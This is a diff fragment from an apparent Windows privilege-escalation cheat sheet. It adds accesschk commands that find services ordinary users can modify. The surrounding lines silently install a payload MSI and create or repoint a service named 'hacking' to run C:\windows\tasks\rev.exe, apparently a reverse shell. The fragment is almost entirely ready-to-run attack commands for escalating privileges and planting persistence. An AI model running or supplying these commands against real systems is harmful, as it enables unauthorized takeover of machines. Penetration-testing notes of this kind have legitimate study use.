@@ -74,6 +74,9 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msiexec /quiet /qn /i C:\Windows\tasks\rev.msi
 
 # services
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *     # list serivces which can be start by current users
+accesschk.exe -uwcqv %USERNAME% * /accepteula                # list serivces which can be start by current users
+accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula           # list serivces which can be start by current users
 sc.exe create hacking binPath="C:\windows\tasks\rev.exe"
 sc.exe config hacking binpath="c:\windows\tasks\rev.exe" # set binpath
 wmic service hacking get Pathname  # print executable path for hacking service  
